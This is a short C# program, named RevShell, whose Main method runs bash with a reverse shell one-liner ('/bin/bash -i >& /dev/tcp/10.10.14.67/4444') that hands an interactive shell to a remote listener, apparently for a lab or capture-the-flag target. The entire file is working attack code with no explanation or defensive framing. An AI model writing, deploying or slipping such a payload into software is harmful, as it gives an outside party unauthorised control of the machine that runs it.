using System;
using System.Diagnostics; 

namespace RevShell
{
    class Program
    {
		public static void Main(string[] args)
		{
			Process proc = new System.Diagnostics.Process();
			proc.StartInfo.FileName = "/bin/bash";
			proc.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/10.10.14.67/4444 0>&1\"";
			proc.StartInfo.UseShellExecute = false;
			proc.StartInfo.RedirectStandardOutput = true;
			proc.Start();

			while (!proc.StandardOutput.EndOfStream)
			{
				Console.WriteLine(proc.StandardOutput.ReadLine());
			}
		}
	}
}
